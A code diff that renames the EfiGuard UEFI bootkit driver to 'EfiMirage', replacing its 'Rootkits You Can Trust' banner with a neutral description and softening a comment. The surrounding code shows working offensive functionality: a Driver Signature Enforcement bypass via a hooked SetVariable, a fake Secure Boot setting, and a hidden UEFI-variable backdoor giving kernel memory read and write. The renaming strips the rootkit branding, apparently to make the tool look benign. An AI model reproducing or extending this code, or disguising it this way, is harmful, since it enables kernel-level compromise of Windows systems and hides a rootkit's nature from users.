@@ -1,4 +1,4 @@
-#include "EfiGuardDxe.h"
+#include "EfiMirageDxe.h"
 
 #include <Protocol/Shell.h>
 #include <Guid/EventGroup.h>
@@ -9,7 +9,7 @@
 //
 // EFI Driver Version Protocol
 //
-EFI_DRIVER_SUPPORTED_EFI_VERSION_PROTOCOL gEfiGuardSupportedEfiVersion =
+EFI_DRIVER_SUPPORTED_EFI_VERSION_PROTOCOL gEfiMirageSupportedEfiVersion =
 {
 	sizeof(EFI_DRIVER_SUPPORTED_EFI_VERSION_PROTOCOL),
 	EFI_2_10_SYSTEM_TABLE_REVISION
@@ -20,20 +20,20 @@ EFI_DRIVER_SUPPORTED_EFI_VERSION_PROTOCOL gEfiGuardSupportedEfiVersion =
 //
 EFI_STATUS
 EFIAPI
-EfiGuardUnload(
+EfiMirageUnload(
 	IN EFI_HANDLE ImageHandle
 	);
 
 //
-// EfiGuard driver protocol
+// EfiMirage driver protocol
 //
 EFI_STATUS
 EFIAPI
 DriverConfigure(
-	IN CONST EFIGUARD_CONFIGURATION_DATA* ConfigurationData
+	IN CONST EFIMIRAGE_CONFIGURATION_DATA* ConfigurationData
 	);
 
-EFIGUARD_DRIVER_PROTOCOL gEfiGuardDriverProtocol =
+EFIMIRAGE_DRIVER_PROTOCOL gEfiMirageDriverProtocol =
 {
 	DriverConfigure
 };
@@ -41,8 +41,8 @@ EFIGUARD_DRIVER_PROTOCOL gEfiGuardDriverProtocol =
 //
 // Default driver configuration used if Configure() is not called
 //
-EFIGUARD_CONFIGURATION_DATA gDriverConfig = {
-	EFIGUARD_CONFIGURATION_DATA_VERSION,	// Version
+EFIMIRAGE_CONFIGURATION_DATA gDriverConfig = {
+	EFIMIRAGE_CONFIGURATION_DATA_VERSION,	// Version
 	DSE_DISABLE_SETVARIABLE_HOOK,			// DseBypassMethod
 	FALSE,									// WaitForKeyPress
 	TRUE,									// FakeSecureBoot
@@ -84,15 +84,8 @@ STATIC EFI_SET_VARIABLE mOriginalSetVariable = NULL;
 #define MM_SYSTEM_RANGE_START	(VOID*)(0x80000000)
 #endif
 
-// Title (adapted from original by Dude719)
-#define EFIGUARD_TITLE1		L"\r\n ██╗     ██╗            ██╗      ██╗   ██╗ " \
-							L"\r\n ████╗ ████║  ██████╗████████╗████████╗╚═╝ " \
-							L"\r\n ██║ ██╔═██║██╔════██╗  ██╔══╝   ██╔══╝██╗ " \
-							L"\r\n ██║ ╚═╝ ██║██║    ██║  ██║      ██║   ██║ " 
-#define EFIGUARD_TITLE2		L"\r\n ██║     ██║ ╚███████║  █████╗   █████╗██║ " \
-							L"\r\n ╚═╝     ╚═╝  ╚══════╝  ╚════╝   ╚════╝╚═╝ " \
-							L"\r\n                                           " \
-							L"\r\n        Rootkits You Can Trust (TM)        \r\n"
+#define EFIMIRAGE_TITLE		L"\r\n EfiMirage\r\n" \
+							L" UEFI boot-chain patching and Secure Boot state emulation\r\n"
 
 
 //
@@ -300,8 +293,8 @@ HookedSetVariable(
 
 	if (gEfiAtRuntime && gEfiGoneVirtual && IsSetVariableHookRequired() &&
 		VariableName != NULL && VariableName[0] != CHAR_NULL && VendorGuid != NULL &&
-		CompareGuid(VendorGuid, EFIGUARD_BACKDOOR_VARIABLE_GUID) &&
-		StrnCmp(VariableName, EFIGUARD_BACKDOOR_VARIABLE_NAME, (sizeof(EFIGUARD_BACKDOOR_VARIABLE_NAME) / sizeof(CHAR16)) - 1) == 0)
+		CompareGuid(VendorGuid, EFIMIRAGE_BACKDOOR_VARIABLE_GUID) &&
+		StrnCmp(VariableName, EFIMIRAGE_BACKDOOR_VARIABLE_NAME, (sizeof(EFIMIRAGE_BACKDOOR_VARIABLE_NAME) / sizeof(CHAR16)) - 1) == 0)
 	{
 		// Yep. Do we have any data?
 		if (DataSize == 0 && Data == NULL)
@@ -311,13 +304,13 @@ HookedSetVariable(
 			return EFI_SUCCESS;
 		}
 
-		if ((Attributes & EFIGUARD_BACKDOOR_VARIABLE_ATTRIBUTES) == EFIGUARD_BACKDOOR_VARIABLE_ATTRIBUTES &&
-			DataSize == EFIGUARD_BACKDOOR_VARIABLE_DATASIZE &&
+		if ((Attributes & EFIMIRAGE_BACKDOOR_VARIABLE_ATTRIBUTES) == EFIMIRAGE_BACKDOOR_VARIABLE_ATTRIBUTES &&
+			DataSize == EFIMIRAGE_BACKDOOR_VARIABLE_DATASIZE &&
 			Data != NULL)
 		{
 			// Yep, and Attributes and DataSize are correct. Check if *Data is a valid input for a backdoor read/write operation
-			EFIGUARD_BACKDOOR_DATA* BackdoorData = Data;
-			if (BackdoorData->CookieValue == EFIGUARD_BACKDOOR_COOKIE_VALUE &&
+			EFIMIRAGE_BACKDOOR_DATA* BackdoorData = Data;
+			if (BackdoorData->CookieValue == EFIMIRAGE_BACKDOOR_COOKIE_VALUE &&
 				BackdoorData->Size > 0 &&
 				(UINTN)BackdoorData->KernelAddress >= (UINTN)MM_SYSTEM_RANGE_START)
 			{
@@ -373,7 +366,7 @@ HookedSetVariable(
 				// Backdoor complete
 				return EFI_SUCCESS;
 			}
-			//else { /*Invalid EFIGUARD_BACKDOOR_DATA* provided*/ }
+			//else { /*Invalid EFIMIRAGE_BACKDOOR_DATA* provided*/ }
 		}
 		//else { /*Data is NULL, or DataSize/Attributes mismatch*/ }
 	}
@@ -464,10 +457,10 @@ ExitBootServicesEvent(
 	{
 		// Uninstall our installed driver protocols
 		gBS->UninstallMultipleProtocolInterfaces(gImageHandle,
-												&gEfiGuardDriverProtocolGuid,
-												&gEfiGuardDriverProtocol,
+												&gEfiMirageDriverProtocolGuid,
+												&gEfiMirageDriverProtocol,
 												&gEfiDriverSupportedEfiVersionProtocolGuid,
-												&gEfiGuardSupportedEfiVersion,
+												&gEfiMirageSupportedEfiVersion,
 												NULL);
 
 		// Unregister SetVirtualAddressMap() notification
@@ -523,7 +516,7 @@ SetVirtualAddressMapEvent(
 EFI_STATUS
 EFIAPI
 DriverConfigure(
-	IN CONST EFIGUARD_CONFIGURATION_DATA* ConfigurationData
+	IN CONST EFIMIRAGE_CONFIGURATION_DATA* ConfigurationData
 	)
 {
 	// Do not allow configure if we are at runtime, or if the Windows boot manager has been loaded
@@ -533,10 +526,10 @@ DriverConfigure(
 	if (ConfigurationData == NULL)
 		return EFI_INVALID_PARAMETER;
 
-	if (ConfigurationData->Version != EFIGUARD_CONFIGURATION_DATA_VERSION)
+	if (ConfigurationData->Version != EFIMIRAGE_CONFIGURATION_DATA_VERSION)
 	{
 		Print(L"Configuration data version mismatch: got %u, expected %u.\r\n",
-			(UINTN)ConfigurationData->Version, (UINTN)EFIGUARD_CONFIGURATION_DATA_VERSION);
+			(UINTN)ConfigurationData->Version, (UINTN)EFIMIRAGE_CONFIGURATION_DATA_VERSION);
 		return EFI_INCOMPATIBLE_VERSION;
 	}
 
@@ -561,7 +554,7 @@ DriverConfigure(
 //
 EFI_STATUS
 EFIAPI
-EfiGuardUnload(
+EfiMirageUnload(
 	IN EFI_HANDLE ImageHandle
 	)
 {
@@ -575,10 +568,10 @@ EfiGuardUnload(
 
 	// Uninstall our installed driver protocols
 	gBS->UninstallMultipleProtocolInterfaces(gImageHandle,
-											&gEfiGuardDriverProtocolGuid,
-											&gEfiGuardDriverProtocol,
+											&gEfiMirageDriverProtocolGuid,
+											&gEfiMirageDriverProtocol,
 											&gEfiDriverSupportedEfiVersionProtocolGuid,
-											&gEfiGuardSupportedEfiVersion,
+											&gEfiMirageSupportedEfiVersion,
 											NULL);
 
 	// Unregister SetVirtualAddressMap() notification
@@ -626,7 +619,7 @@ EfiGuardUnload(
 // 
 EFI_STATUS
 EFIAPI
-EfiGuardInitialize(
+EfiMirageInitialize(
 	IN EFI_HANDLE ImageHandle,
 	IN EFI_SYSTEM_TABLE *SystemTable
 	)
@@ -634,10 +627,10 @@ EfiGuardInitialize(
 	ASSERT(ImageHandle == gImageHandle);
 
 	// Check if we're not already loaded.
-	EFIGUARD_DRIVER_PROTOCOL* EfiGuardDriverProtocol;
-	EFI_STATUS Status = gBS->LocateProtocol(&gEfiGuardDriverProtocolGuid,
+	EFIMIRAGE_DRIVER_PROTOCOL* EfiMirageDriverProtocol;
+	EFI_STATUS Status = gBS->LocateProtocol(&gEfiMirageDriverProtocolGuid,
 											NULL,
-											(VOID**)&EfiGuardDriverProtocol);
+											(VOID**)&EfiMirageDriverProtocol);
 	if (Status != EFI_NOT_FOUND)
 	{
 		Print(L"An instance of the driver is already loaded.\r\n");
@@ -649,7 +642,7 @@ EfiGuardInitialize(
 	//
 	Status = gBS->InstallMultipleProtocolInterfaces(&gImageHandle,
 													&gEfiDriverSupportedEfiVersionProtocolGuid,
-													&gEfiGuardSupportedEfiVersion,
+													&gEfiMirageSupportedEfiVersion,
 													NULL);
 	if (EFI_ERROR(Status))
 	{
@@ -663,12 +656,12 @@ EfiGuardInitialize(
 	gBS->HandleProtocol(gST->ConsoleInHandle, &gEfiSimpleTextInputExProtocolGuid, (VOID **)&gTextInputEx);
 
 	//
-	// Install EfiGuard driver protocol
+	// Install EfiMirage driver protocol
 	//
 	Status = gBS->InstallProtocolInterface(&gImageHandle,
-											&gEfiGuardDriverProtocolGuid,
+											&gEfiMirageDriverProtocolGuid,
 											EFI_NATIVE_INTERFACE,
-											&gEfiGuardDriverProtocol);
+											&gEfiMirageDriverProtocol);
 	if (EFI_ERROR(Status))
 		goto Exit;
 
@@ -677,8 +670,7 @@ EfiGuardInitialize(
 	//
 	CONST INT32 OriginalAttribute = SetConsoleTextColour(EFI_GREEN, TRUE);
 	Print(L"\r\n\r\n");
-	Print(L"%S", EFIGUARD_TITLE1);
-	Print(L"%S", EFIGUARD_TITLE2);
+	Print(L"%S", EFIMIRAGE_TITLE);
 	gST->ConOut->SetAttribute(gST->ConOut, OriginalAttribute);
 
 	EFI_LOADED_IMAGE_PROTOCOL *LocalImageInfo;
@@ -744,17 +736,17 @@ EfiGuardInitialize(
 	gKernelPatchInfo.KernelBuildNumber = 0;
 	gKernelPatchInfo.KernelBase = NULL;
 
-	// The ASCII banner is very pretty - ensure the user has enough time to admire it
+	// Keep the driver identity visible before the patch-stage output begins.
 	RtlSleep(1500);
 
 Exit:
 	if (EFI_ERROR(Status))
 	{
-		Print(L"\r\nEfiGuardDxe initialization failed with status %llx (%r)\r\n", Status, Status);
+		Print(L"\r\nEfiMirageDxe initialization failed with status %llx (%r)\r\n", Status, Status);
 
 		// Because we do not use the driver binding protocol, recovering from a failed load is simple.
 		// We can just call the unload function, which will only unload that which was actually installed.
-		EfiGuardUnload(gImageHandle);
+		EfiMirageUnload(gImageHandle);
 	}
 	return Status;
 }
